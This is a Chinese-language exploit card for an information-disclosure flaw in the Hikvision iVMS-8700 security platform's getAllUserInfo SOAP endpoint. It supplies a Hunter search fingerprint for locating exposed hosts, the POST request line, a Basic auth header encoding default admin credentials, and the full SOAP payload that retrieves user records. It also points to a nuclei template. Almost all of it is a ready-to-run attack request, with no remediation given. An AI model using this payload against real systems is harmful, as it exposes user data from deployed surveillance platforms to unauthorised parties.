# 海康威视iVMS-8700综合安防管理平台getAllUserInfo存在信息泄露漏洞

- **系统**：海康　|　**类型**：信息泄露　|　**CVE**：—
- **指纹**：`hunter：`web.body="/views/home/file/installPackage.rar"``
- **请求**：`POST /services/IWsBaseService.IWsBaseServiceHttpSoap11Endpoint HTTP/1.1`
- **关键头**：`Host: {hostname}`　`Content-Length: 569`　`Authorization: Basic YWRtaW46MTIzNDU2`

**请求体 / payload**
```
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:impl="http://impl.ws.api.base.cms.hikvision.com" xmlns:xsd="http://ws.common.cms.hikvision.com/xsd">
<soapenv:Header/>
<soapenv:Body>
<impl:getAllUserInfo>
<impl:request>
<!--type: int-->
<xsd:pageNo>1</xsd:pageNo>
<!--type: int-->
<xsd:pageSize>1</xsd:pageSize>
</impl:request>
<!--type: long-->
<impl:updTime></impl:updTime>
</impl:getAllUserInfo>
</soapenv:Body>
</soapenv:Envelope>

nuclei脚本：\
\[海康威视-ivms-8700-信息泄露.yaml]\(公众号：渗透安全HackTwo>
```

**其他**
- 海康威视iVMS-8700综合安防管理平台 getAllUserInfo存在信息泄露漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 海康威视综合安防系统iVMS-5000
* 海康威视综合安防系统 iVMS-8700